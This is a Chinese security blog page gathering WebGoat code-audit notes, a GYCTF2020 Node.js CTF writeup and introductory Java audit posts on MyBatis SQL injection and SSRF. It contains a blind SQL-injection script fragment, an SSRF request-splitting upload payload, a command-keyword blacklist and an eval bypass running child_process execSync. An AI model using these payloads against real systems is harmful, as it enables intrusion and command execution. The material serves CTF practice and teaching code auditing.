-<p>​    <code>data = &quot;username_reg=tom&#39;+and+substr(password,&#123;0&#125;,1)=&#39;&#123;1&#125;&#39;--+-&amp;email_reg=123456@qq.com&amp;password_reg=123456&amp;confirm_password_reg=123&quot;.format(i,char)</code></p>
-<p>​    <code>req = requests.put(url,data=data,headers=headers,cookies=cookie,proxies=proxy)</code></p>
-<p>​    <code>\#print(data,req.text)</code></p>
-<p>​    <code>if &#39;already exists&#39; in req.text:</code></p>
-<p>​      <code>text += char</code></p>
-<p>​      <code>print(text)</code></p>
-<p>  <code>if temp == text:</code></p>
-<p>​    <code>break</code></p>
-<p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200801144818774.png" alt="image-20200801144818774"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/08/01/Webgoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88%E4%BA%8C%EF%BC%89/" data-id="ckemqkeaw0014astychot0c2f" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-Webgoat8代码审计（一）" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/07/31/Webgoat8%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88%E4%B8%80%EF%BC%89/" class="article-date">
-  <time datetime="2020-07-31T13:43:46.282Z" itemprop="datePublished">2020-07-31</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="Webgoat8代码审计（一）"><a href="#Webgoat8代码审计（一）" class="headerlink" title="Webgoat8代码审计（一）"></a>Webgoat8代码审计（一）</h1><p>先看看/SqlInjection/attack2</p>
-<pre><code>
-    @PostMapping(&quot;/SqlInjection/attack2&quot;)
-    @ResponseBody
-    public AttackResult completed(@RequestParam String query) &#123;
-        return injectableQuery(query);
-    &#125;
-
-    protected AttackResult injectableQuery(String query) &#123;
-        try (var connection = dataSource.getConnection()) &#123;
-            Statement statement = connection.createStatement(TYPE_SCROLL_INSENSITIVE, CONCUR_READ_ONLY);
-            ResultSet results = statement.executeQuery(query);
-            StringBuffer output = new StringBuffer();
-
-            results.first();
-
-            if (results.getString(&quot;department&quot;).equals(&quot;Marketing&quot;)) &#123;
-                output.append(&quot;&lt;span class=&#39;feedback-positive&#39;&gt;&quot; + query + &quot;&lt;/span&gt;&quot;);
-                output.append(SqlInjectionLesson8.generateTable(results));
-                return success(this).feedback(&quot;sql-injection.2.success&quot;).output(output.toString()).build();
-            &#125; else &#123;
-                return failed(this).feedback(&quot;sql-injection.2.failed&quot;).output(output.toString()).build();
-            &#125;
-        &#125; catch (SQLException sqle) &#123;
-            return failed(this).feedback(&quot;sql-injection.2.failed&quot;).output(sqle.getMessage()).build();
-        &#125;
-    &#125;
-&#125;</code></pre><p>可以看到这里是直接将输入的参数query执行。</p>
-<p>less-8</p>
-<p>页面上已经把sql语句给写下来了。</p>
-<img src="C:\Users\ykpc\AppData\Roaming\Typora\typora-user-images\image-20200731171000534.png" alt="image-20200731171000534" style="zoom:150%;" />
-
-<p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200731175604988.png" alt="image-20200731175604988"></p>
-<p> <code>**@PostMapping**  **public**  **@ResponseBody**  AttackResult **completed**(@RequestParam String account, @RequestParam String operator, @RequestParam String injection) &#123;    **return** injectableQuery(account + &quot; &quot; + operator + &quot; &quot; + injection);  &#125;   **protected** AttackResult **injectableQuery**(String accountName) &#123;    String query = &quot;&quot;;    **try** &#123;      Connection connection = DatabaseUtilities.getConnection(getWebSession());      *//非常明显，accountName完全可控，直接丢到statement.executeQuery(query)中执行sql查询。*      query = &quot;SELECT * FROM user_data WHERE first_name = &#39;John&#39; and last_name = &#39;&quot; + accountName + &quot;&#39;&quot;;      **try**(Statement statement = connection.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,              ResultSet.CONCUR_READ_ONLY)) &#123;         ResultSet results = statement.executeQuery(query);        ......</code></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/07/31/Webgoat8%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88%E4%B8%80%EF%BC%89/" data-id="ckemqkeav0011asty2hxy90ld" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-[GYCTF2020]Node Game" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/07/31/%5BGYCTF2020%5DNode%20Game/" class="article-date">
-  <time datetime="2020-07-31T03:40:11.350Z" itemprop="datePublished">2020-07-31</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="GYCTF2020-Node-Game"><a href="#GYCTF2020-Node-Game" class="headerlink" title="[GYCTF2020]Node Game"></a>[GYCTF2020]Node Game</h2><p>最近总是遇到Node.js的题目可是我都不会</p>
-<p>下面是这题的源码：</p>
-<table>
-<thead>
-<tr>
-<th></th>
-<th>var express = require(‘express’);</th>
-</tr>
-</thead>
-<tbody><tr>
-<td></td>
-<td>var app = express();</td>
-</tr>
-<tr>
-<td></td>
-<td>var fs = require(‘fs’);</td>
-</tr>
-<tr>
-<td></td>
-<td>var path = require(‘path’);</td>
-</tr>
-<tr>
-<td></td>
-<td>var http = require(‘http’);</td>
-</tr>
-<tr>
-<td></td>
-<td>var pug = require(‘pug’);</td>
-</tr>
-<tr>
-<td></td>
-<td>var morgan = require(‘morgan’);</td>
-</tr>
-<tr>
-<td></td>
-<td>const multer = require(‘multer’);</td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td></td>
-<td>app.use(multer({dest: ‘./dist’}).array(‘file’));</td>
-</tr>
-<tr>
-<td></td>
-<td>app.use(morgan(‘short’));</td>
-</tr>
-<tr>
-<td></td>
-<td>app.use(“/uploads”,express.static(path.join(__dirname, ‘/uploads’)))</td>
-</tr>
-<tr>
-<td></td>
-<td>app.use(“/template”,express.static(path.join(__dirname, ‘/template’)))</td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td></td>
-<td>app.get(‘/‘, function(req, res) {</td>
-</tr>
-<tr>
-<td></td>
-<td>var action = req.query.action?req.query.action:”index”;</td>
-</tr>
-<tr>
-<td></td>
-<td>if( action.includes(“/“) || action.includes(“\“) ){</td>
-</tr>
-<tr>
-<td></td>
-<td>res.send(“Errrrr, You have been Blocked”);</td>
-</tr>
-<tr>
-<td></td>
-<td>}</td>
-</tr>
-<tr>
-<td></td>
-<td>file = path.join(__dirname + ‘/template/‘+ action +’.pug’);</td>
-</tr>
-<tr>
-<td></td>
-<td>var html = pug.renderFile(file);</td>
-</tr>
-<tr>
-<td></td>
-<td>res.send(html);</td>
-</tr>
-<tr>
-<td></td>
-<td>});</td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td></td>
-<td>app.post(‘/file_upload’, function(req, res){</td>
-</tr>
-<tr>
-<td></td>
-<td>var ip = req.connection.remoteAddress;</td>
-</tr>
-<tr>
-<td></td>
-<td>var obj = {</td>
-</tr>
-<tr>
-<td></td>
-<td>msg: ‘’,</td>
-</tr>
-<tr>
-<td></td>
-<td>}</td>
-</tr>
-<tr>
-<td></td>
-<td>if (!ip.includes(‘127.0.0.1’)) {</td>
-</tr>
-<tr>
-<td></td>
-<td>obj.msg=”only admin’s ip can use it”</td>
-</tr>
-<tr>
-<td></td>
-<td>res.send(JSON.stringify(obj));</td>
-</tr>
-<tr>
-<td></td>
-<td>return</td>
-</tr>
-<tr>
-<td></td>
-<td>}</td>
-</tr>
-<tr>
-<td></td>
-<td>fs.readFile(req.files[0].path, function(err, data){</td>
-</tr>
-<tr>
-<td></td>
-<td>if(err){</td>
-</tr>
-<tr>
-<td></td>
-<td>obj.msg = ‘upload failed’;</td>
-</tr>
-<tr>
-<td></td>
-<td>res.send(JSON.stringify(obj));</td>
-</tr>
-<tr>
-<td></td>
-<td>}else{</td>
-</tr>
-<tr>
-<td></td>
-<td>var file_path = ‘/uploads/‘ + req.files[0].mimetype +”/“;</td>
-</tr>
-<tr>
-<td></td>
-<td>var file_name = req.files[0].originalname</td>
-</tr>
-<tr>
-<td></td>
-<td>var dir_file = __dirname + file_path + file_name</td>
-</tr>
-<tr>
-<td></td>
-<td>if(!fs.existsSync(__dirname + file_path)){</td>
-</tr>
-<tr>
-<td></td>
-<td>try {</td>
-</tr>
-<tr>
-<td></td>
-<td>fs.mkdirSync(__dirname + file_path)</td>
-</tr>
-<tr>
-<td></td>
-<td>} catch (error) {</td>
-</tr>
-<tr>
-<td></td>
-<td>obj.msg = “file type error”;</td>
-</tr>
-<tr>
-<td></td>
-<td>res.send(JSON.stringify(obj));</td>
-</tr>
-<tr>
-<td></td>
-<td>return</td>
-</tr>
-<tr>
-<td></td>
-<td>}</td>
-</tr>
-<tr>
-<td></td>
-<td>}</td>
-</tr>
-<tr>
-<td></td>
-<td>try {</td>
-</tr>
-<tr>
-<td></td>
-<td>fs.writeFileSync(dir_file,data)</td>
-</tr>
-<tr>
-<td></td>
-<td>obj = {</td>
-</tr>
-<tr>
-<td></td>
-<td>msg: ‘upload success’,</td>
-</tr>
-<tr>
-<td></td>
-<td>filename: file_path + file_name</td>
-</tr>
-<tr>
-<td></td>
-<td>}</td>
-</tr>
-<tr>
-<td></td>
-<td>} catch (error) {</td>
-</tr>
-<tr>
-<td></td>
-<td>obj.msg = ‘upload failed’;</td>
-</tr>
-<tr>
-<td></td>
-<td>}</td>
-</tr>
-<tr>
-<td></td>
-<td>res.send(JSON.stringify(obj));</td>
-</tr>
-<tr>
-<td></td>
-<td>}</td>
-</tr>
-<tr>
-<td></td>
-<td>})</td>
-</tr>
-<tr>
-<td></td>
-<td>})</td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td></td>
-<td>app.get(‘/source’, function(req, res) {</td>
-</tr>
-<tr>
-<td></td>
-<td>res.sendFile(path.join(__dirname + ‘/template/source.txt’));</td>
-</tr>
-<tr>
-<td></td>
-<td>});</td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td></td>
-<td>app.get(‘/core’, function(req, res) {</td>
-</tr>
-<tr>
-<td></td>
-<td>var q = req.query.q;</td>
-</tr>
-<tr>
-<td></td>
-<td>var resp = “”;</td>
-</tr>
-<tr>
-<td></td>
-<td>if (q) {</td>
-</tr>
-<tr>
-<td></td>
-<td>var url = ‘<a target="_blank" rel="noopener" href="http://localhost:8081/source?&#39;">http://localhost:8081/source?&#39;</a> + q</td>
-</tr>
-<tr>
-<td></td>
-<td>console.log(url)</td>
-</tr>
-<tr>
-<td></td>
-<td>var trigger = blacklist(url);</td>
-</tr>
-<tr>
-<td></td>
-<td>if (trigger === true) {</td>
-</tr>
-<tr>
-<td></td>
-<td>res.send(“<p>error occurs!</p>“);</td>
-</tr>
-<tr>
-<td></td>
-<td>} else {</td>
-</tr>
-<tr>
-<td></td>
-<td>try {</td>
-</tr>
-<tr>
-<td></td>
-<td>http.get(url, function(resp) {</td>
-</tr>
-<tr>
-<td></td>
-<td>resp.setEncoding(‘utf8’);</td>
-</tr>
-<tr>
-<td></td>
-<td>resp.on(‘error’, function(err) {</td>
-</tr>
-<tr>
-<td></td>
-<td>if (err.code === “ECONNRESET”) {</td>
-</tr>
-<tr>
-<td></td>
-<td>console.log(“Timeout occurs”);</td>
-</tr>
-<tr>
-<td></td>
-<td>return;</td>
-</tr>
-<tr>
-<td></td>
-<td>}</td>
-</tr>
-<tr>
-<td></td>
-<td>});</td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td></td>
-<td>resp.on(‘data’, function(chunk) {</td>
-</tr>
-<tr>
-<td></td>
-<td>try {</td>
-</tr>
-<tr>
-<td></td>
-<td>resps = chunk.toString();</td>
-</tr>
-<tr>
-<td></td>
-<td>res.send(resps);</td>
-</tr>
-<tr>
-<td></td>
-<td>}catch (e) {</td>
-</tr>
-<tr>
-<td></td>
-<td>res.send(e.message);</td>
-</tr>
-<tr>
-<td></td>
-<td>}</td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td></td>
-<td>}).on(‘error’, (e) =&gt; {</td>
-</tr>
-<tr>
-<td></td>
-<td>res.send(e.message);});</td>
-</tr>
-<tr>
-<td></td>
-<td>});</td>
-</tr>
-<tr>
-<td></td>
-<td>} catch (error) {</td>
-</tr>
-<tr>
-<td></td>
-<td>console.log(error);</td>
-</tr>
-<tr>
-<td></td>
-<td>}</td>
-</tr>
-<tr>
-<td></td>
-<td>}</td>
-</tr>
-<tr>
-<td></td>
-<td>} else {</td>
-</tr>
-<tr>
-<td></td>
-<td>res.send(“search param ‘q’ missing!”);</td>
-</tr>
-<tr>
-<td></td>
-<td>}</td>
-</tr>
-<tr>
-<td></td>
-<td>})</td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td></td>
-<td>function blacklist(url) {</td>
-</tr>
-<tr>
-<td></td>
-<td>var evilwords = [“global”, “process”,”mainModule”,”require”,”root”,”child_process”,”exec”,”&quot;“,”‘“,”!”];</td>
-</tr>
-<tr>
-<td></td>
-<td>var arrayLen = evilwords.length;</td>
-</tr>
-<tr>
-<td></td>
-<td>for (var i = 0; i &lt; arrayLen; i++) {</td>
-</tr>
-<tr>
-<td></td>
-<td>const trigger = url.includes(evilwords[i]);</td>
-</tr>
-<tr>
-<td></td>
-<td>if (trigger === true) {</td>
-</tr>
-<tr>
-<td></td>
-<td>return true</td>
-</tr>
-<tr>
-<td></td>
-<td>}</td>
-</tr>
-<tr>
-<td></td>
-<td>}</td>
-</tr>
-<tr>
-<td></td>
-<td>}</td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td></td>
-<td>var server = app.listen(8081, function() {</td>
-</tr>
-<tr>
-<td></td>
-<td>var host = server.address().address</td>
-</tr>
-<tr>
-<td></td>
-<td>var port = server.address().port</td>
-</tr>
-<tr>
-<td></td>
-<td>console.log(“Example app listening at http://%s:%s”, host, port)</td>
-</tr>
-<tr>
-<td></td>
-<td>})</td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-</tr>
-</tbody></table>
-<p>可以看见这题有SSRF和任意文件上传</p>
-<pre><code class="javascript">app.get(&#39;/&#39;, function(req, res) &#123;
-    var action = req.query.action?req.query.action:&quot;index&quot;;
-    if( action.includes(&quot;/&quot;) || action.includes(&quot;\\&quot;) )&#123;
-        res.send(&quot;Errrrr, You have been Blocked&quot;);
-    &#125;
-    file = path.join(__dirname + &#39;/template/&#39;+ action +&#39;.pug&#39;);
-    var html = pug.renderFile(file);
-    res.send(html);
-&#125;);</code></pre>
-<p>看到首页接受了一个action参数，会将我们上传到/template/目录下的文件pug渲染。并且返回值。这样的话我们思路大致就清晰了：<br> 还是通过core进行ssrf并伪造文件上传的http包访问到/flag。之后直接首页文件包含触发渲染，就可以访问到内容。</p>
-<p>这里是构造头：</p>
-<pre><code class="cpp">Content-Type: /../template（因为var file_path = &#39;/uploads/&#39; + req.files[0].mimetype +&quot;/&quot;;）
-Content-Length:292
-Connection:keep-alive</code></pre>
-<p>然后用一下网上的payload：（写不来呜呜）</p>
-<p><code>import urllib.parse</code></p>
-<p><code>import requests</code></p>
-<p><code>payload = &#39;&#39;&#39; HTTP/1.1</code></p>
-<p><code>POST /file_upload HTTP/1.1</code></p>
-<p><code>Content-Type: multipart/form-data; boundary=--------------------------919695033422425209299810</code></p>
-<p><code>Content-Length: 291</code></p>
-<p><code>----------------------------919695033422425209299810</code></p>
-<p><code>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;abc.pug&quot;</code></p>
-<p><code>Content-Type: ../template</code></p>
-<p><code>doctype html</code></p>
-<p><code>html</code></p>
-<p> <code>head</code></p>
-<p>  <code>style</code></p>
-<p>   <code>include ../../../../../../../flag.txt</code></p>
-<p><code>----------------------------919695033422425209299810--</code></p>
-<p><code>GET /flag HTTP/1.1</code></p>
-<p><code>x:&#39;&#39;&#39;</code></p>
-<p><code>payload = payload.replace(&quot;\n&quot;, &quot;\r\n&quot;)</code></p>
-<p><code>payload = &#39;&#39;.join(chr(int(&#39;0xff&#39; + hex(ord(c))[2:].zfill(2), 16)) for c in payload)</code></p>
-<p><code>r = requests.get(&#39;http://07a0e2fe-ea38-49d6-8b00-b7e3261e9171.node3.buuoj.cn/core?q=&#39; + urllib.parse.quote(payload))</code></p>
-<p><code>print(r.text)</code></p>
-<p>访问/?action=abc得到flag</p>
-<p>bypass命令执行<br>出题人writeup<br><code>https://blog.5am3.com/2020/02/11/ctf-node1/#%E8%87%AA%E5%B7%B1%E5%87%BA%E7%9A%84-node-gamev</code><br>是通过对参数URL编码绕过。<br>当然还能通过字符串拼接的方式绕过</p>
-<pre><code>-var x = eval(&quot;glob&quot;+&quot;al.proce&quot;+&quot;ss.mainMo&quot;+&quot;dule.re&quot;+&quot;quire(&#39;child_&#39;+&#39;pro&#39;+&#39;cess&#39;)[&#39;ex&#39;+&#39;ecSync&#39;](&#39;whoami&#39;).toString()&quot;)
--return x</code></pre>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/07/31/[GYCTF2020]Node%20Game/" data-id="ckemqkeb2001fastye3gk7itu" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-Java代码审计入门(二)" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/07/26/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8(%E4%BA%8C)/" class="article-date">
-  <time datetime="2020-07-26T08:33:28.658Z" itemprop="datePublished">2020-07-26</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="Java代码审计入门-二"><a href="#Java代码审计入门-二" class="headerlink" title="Java代码审计入门(二)"></a>Java代码审计入门(二)</h1><h1 id="MyBatis"><a href="#MyBatis" class="headerlink" title="MyBatis"></a>MyBatis</h1><p>基础篇提到的 <code>JEESNS</code> 用的就是 <code>MyBatis</code>，略过介绍。</p>
-<p><code>MyBatis</code> 使用内联参数 <code>$&#123;example&#125;</code> 或 <code>#&#123;example&#125;</code>，将查询的属性和参数做绑定，如下：</p>
-<p>${}</p>
-<pre><code>&lt;select id=&quot;selectStudentByStuId&quot; resultMap=&quot;studentMap&quot;&gt;
-    SELECT *
-    FROM student
-    WHERE stu_id = $&#123;stuId&#125;
-&lt;/select&gt;</code></pre><p>#{}</p>
-<pre><code>&lt;select id=&quot;selectStudentByStuId&quot; resultMap=&quot;studentMap&quot;&gt;
-    SELECT *
-    FROM student
-    WHERE stu_id = #&#123;stuId&#125;
-&lt;/select&gt;</code></pre><p>两种方式有什么区别呢？接着看。</p>
-<h2 id="（不安全的写法）"><a href="#（不安全的写法）" class="headerlink" title="${} （不安全的写法）"></a>${} <em>（不安全的写法）</em></h2><p>使用 <code>$&#123;foo&#125;</code> 这样格式的传入参数会直接参与SQL编译，类似字符串拼接的效果，是存在SQL注入漏洞的。所以一般情况下，不会用这种方式绑定参数。</p>
-<h2 id=""><a href="#" class="headerlink" title="#{}"></a>#{}</h2><p>使用 <code>#&#123;&#125;</code> 做参数绑定时， <code>MyBatis</code> 会将SQL语句进行预编译，避免SQL注入的问题。</p>
-<p><code>MyBatis</code> 预编译模式的实现，在底层同样是依赖于 <code>java.sql.PreparedStatement</code>，所以 <code>PreparedStatement</code> 存在的问题，这里也会存在。</p>
-<p><code>ORDER BY</code> 只能通过 <code>$&#123;&#125;</code> 传递。为了避免SQL注入，需要手动过滤，或者在SQL里硬编码 <code>ORDER BY</code> 的字段名。</p>
-<p>此外，还有一种情况 —— <code>LIKE</code> 模糊查询。</p>
-<p>看下面这个写法：</p>
-<pre><code>&lt;select id=&quot;selectStudentByFuzzyQuery&quot; resultMap=&quot;studentMap&quot;&gt;
-    SELECT *
-    FROM student
-    WHERE student.stu_name
-            LIKE &#39;%#&#123;stuName&#125;%&#39;
-&lt;/select&gt;</code></pre><p>在这里，<code>MyBatis</code> 会把 <code>%#&#123;stuName&#125;%</code> 作为要查询的参数，数据库会执行 <code>SELECT * FROM student WHERE student.stu_name LIKE &#39;%#&#123;stuName&#125;%&#39;</code>，导致查询失败，所以这里只能用 <code>$&#123;&#125;</code> 的方式传入。而如果用 <code>$&#123;&#125;</code> 又存在SQL注入的风险，怎么办呢？</p>
-<p>最好的方法是，使用数据库自带的 <code>CONCAT</code> ，将 <code>%</code> 和我们用 <code>#&#123;&#125;</code> 传入参数连接起来，这样就既不存在注入的问题，也能满足需求啦。示例：</p>
-<pre><code>&lt;select id=&quot;selectStudentByFuzzyQuery&quot; resultMap=&quot;studentMap&quot;&gt;
-    SELECT *
-    FROM student
-    WHERE student.stu_name
-            LIKE CONCAT(&#39;%&#39;,#&#123;stuName&#125;,&#39;%&#39;)
-&lt;/select&gt;</code></pre><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h1 id="发起请求的流程"><a href="#发起请求的流程" class="headerlink" title="发起请求的流程"></a>发起请求的流程</h1><p>构造一个简单的 <code>http</code> 请求：</p>
-<pre><code>try &#123;
-    URL u = new URL(url);
-    URLConnection urlConnection = u.openConnection();
-    InputStream inputStream = urlConnection.getInputStream();
-
-    //...
-&#125; catch (IOException e) &#123;
-    e.printStackTrace();
-&#125;</code></pre><p>简述下这个过程，首先，构造一个 <code>URL</code> 对象，调用 <code>url</code> 的 <code>openConnection()</code> 方法来获取一个 <code>URLConnection</code> 实例，然后再调 <code>getInputStream()</code> 拿到 <code>InputStream</code>，也就是请求的响应流。之后，再做我们想要的其它事情。</p>
-<p>在这个过程中，如果 <code>URL</code> 是可控的，那么就会存在 <code>SSRF</code> 漏洞。</p>
-<p>这是 <code>JDK</code> 自带的类，它的 <code>read()</code> 方法，用来加载图片。它可以传入一个 <code>URL</code> 对象，且没有协议限制，如下：</p>
-<p>ImageIO.java:1386</p>
-<pre><code>public static BufferedImage read(URL input) throws IOException &#123;
-    if (input == null) &#123;
-        throw new IllegalArgumentException(&quot;input == null!&quot;);
-    &#125;
-
-    InputStream istream = null;
-    try &#123;
-        istream = input.openStream();
-    &#125; catch (IOException e) &#123;
-        throw new IIOException(&quot;Can&#39;t get input stream from URL!&quot;, e);
-    &#125;
-    ImageInputStream stream = createImageInputStream(istream);
-    BufferedImage bi;
-    try &#123;
-        bi = read(stream);
-        if (bi == null) &#123;
-            stream.close();
-        &#125;
-    &#125; finally &#123;
-        istream.close();
-    &#125;
-    return bi;
-&#125;</code></pre><p><strong>如果服务器在加载图片时，<code>URL</code> 是用户可控的，那么就会存在 <code>SSRF</code> 漏洞。</strong></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/07/26/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8(%E4%BA%8C)/" data-id="ckemqkeal000fasty1ib55s6v" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-Java代码审计入门(一)" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/07/26/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8(%E4%B8%80)/" class="article-date">
-  <time datetime="2020-07-26T04:03:54.716Z" itemprop="datePublished">2020-07-26</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="Java代码审计入门-一"><a href="#Java代码审计入门-一" class="headerlink" title="Java代码审计入门(一)"></a>Java代码审计入门(一)</h1><h2 id="基本环境"><a href="#基本环境" class="headerlink" title="基本环境"></a>基本环境</h2><p>目前，<code>JDK</code>已经出到<code>11</code>了，<code>JDK</code>每个版本都会有些新特性出来。很多情况下<code>JDK</code>并不向下兼容，导致一些软件在较新的<code>JDK</code>中无法正常运行，所以推荐用现在比较主流的<code>JDK8</code>。而且有些漏洞需要在低版本的<code>JDK</code>上才能复现出来，比如反序列化用到的<code>JNDI Bean Property</code>类型的<code>Gadget</code>，需要在小于<code>JDK8_113</code>的版本下才可以利用，所以在安装的时候建议再安装一个低版本的JDK。JDK安装时自带的控制面板程序，可以帮助我们很方便的切换版本。</p>
-<p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200726100447203.png" alt="image-20200726100447203"></p>
-<p>我们在审计一个项目的时候，最开始应该是先熟悉项目的结构，了解项目的技术栈。</p>
-<p>本篇，我会引入一个开源的 Java Web 项目，通过实例分析 Java Web 的项目结构，常用的 MVC 模式。</p>
-<h1 id="JEESNS"><a href="#JEESNS" class="headerlink" title="JEESNS"></a>JEESNS</h1><p><a target="_blank" rel="noopener" href="https://github.com/zchuanzhao/jeesns">JEESNS</a>，是一款基于 JAVA 企业级平台研发的社交管理系统，在 github 上有 200+ star，在开源的 Java Web 项目中算是还不错的了。</p>
-<p>项目地址： <a target="_blank" rel="noopener" href="https://github.com/zchuanzhao/jeesns">https://github.com/zchuanzhao/jeesns</a></p>
-<p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200726101755011.png" alt="image-20200726101755011"></p>
-<h2 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h2><p>在项目根目录吓，有一个pom.xml的文件，这个文件的存在，表面项目用Maven构建。它可以管理项目源码、配置文件，不过最大的用处还是处理<strong>项目的依赖关系</strong>。</p>
-<p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200726102705695.png" alt="image-20200726102705695"></p>
-<p>红框的 ① 处，描述了这个项目的开发组织，项目名称，项目版本。</p>
-<p>② 处，用的是<code>modules</code>标签，说明这是一个多模块项目。在左边的导航栏，可以看到确实有许多子模块。</p>
-<blockquote>
-<p>多模块项目是为了在项目开发中便于后期维护，所以采用分层开发的方法，这样各个模块的职责会比较的明确，维护起来相对容易。在打包时，只要对父模块打包即可，子模块会自动合并进来。</p>
-</blockquote>
-<p>③ 处，是 maven 在构建时相关的配置，这里用了一个 compiler 插件，表示源码用的是<code>1.7</code>的<code>JDK</code>并且生成的目标字节码文件也要是<code>1.7</code>的。</p>
-<p>随便点一个<code>pom.xml</code>，它和根目录下的<code>pom.xml</code>有所不同，多了一个<code>&lt;parent&gt;</code>标签，和<code>dependencies</code>。</p>
-<p><code>&lt;parent&gt;</code>标签，表示这个子模块，将上级的<code>jeesns</code>项目作父模块。</p>
-<p><code>dependencies</code>，描述了这个模块的依赖关系。当前的<code>web</code>模块依赖于子模块<code>core</code>,<code>model</code>,<code>service</code>,<code>common</code>。而子模块<code>core</code>里，依赖于许多的第三方库，包括<code>Spring</code>、<code>MyBatis</code>、<code>apache-commons</code>等。它们都继承了上级的<code>jeesns</code>父模块，在逻辑上同属一个项目。</p>
-<h3 id="jeesns-core"><a href="#jeesns-core" class="headerlink" title="jeesns-core"></a>jeesns-core</h3><p>主要使用了 <code>SSM框架</code> (Spring+SpringMVC+MyBatis)， <code>freemarker</code> 模板引擎，支持 <code>MySQL</code> 数据库，使用 <code>c3p0</code> 连接池，<code>jackson</code> 处理 <code>json</code> 数据，<code>hibernate-validator</code> 对用户传来的请求数据进行有效性验证，还有一些 <code>apache</code> 提供的工具类。</p>
-<p>好像我下载的项目这个模块不一样，先看看下面。</p>
-<h3 id="jeesns-dao"><a href="#jeesns-dao" class="headerlink" title="jeesns-dao"></a>jeesns-dao</h3><p><code>DAO</code> 层，负责数据持久化，通俗点说就是用来和数据库交互，读写数据的模块。</p>
-<p>前面有说到，<code>JEESNS</code> 用了 <code>MyBatis</code> 作为数据持久化框架。<code>MyBatis</code> 属于半自动 <code>ORM</code> ，它会帮我们自动将数据查询结果映射到对象，但是数据查询的 <code>SQL</code> 语句还是要我们自己手写，这点和其它的 <code>ORM</code> 明显的不一样。</p>
-<p><code>MyBatis</code> 的使用方式主要有两种，一种是使用<code>注解</code>，直接将<code>SQL</code>语句和<code>方法</code>绑定在一起，像下面这样：</p>
-<pre><code>package org.mybatis.example;
-public interface BlogMapper &#123;
-  @Select(&quot;SELECT * FROM blog WHERE id = #&#123;id&#125;&quot;)
-  Blog selectBlog(int id);
-&#125;</code></pre><p>这种方式，适合简单的<code>SQL</code>语句，一旦语句长了，注释会变得复杂混乱，维护起来很麻烦，所以它只适合小项目（小项目用的也不多）。</p>
-<p>用的最多的是第二种——<code>XML</code>配置，将<code>SQL</code>语句和<code>Java</code>代码分离，有独立的<code>xml</code>文件，描述某个方法会和某个<code>SQL</code>语句绑定。</p>
-<p>这是网上的图，我找不到原来的项目。</p>
-<p><img src="C:%5CUsers%5Cykpc%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200726103908328.png" alt="image-20200726103908328"></p>
-<p>如图接口在目录中都有对应的xml。接口中的方法和xml中id相同的sql语句关联。</p>
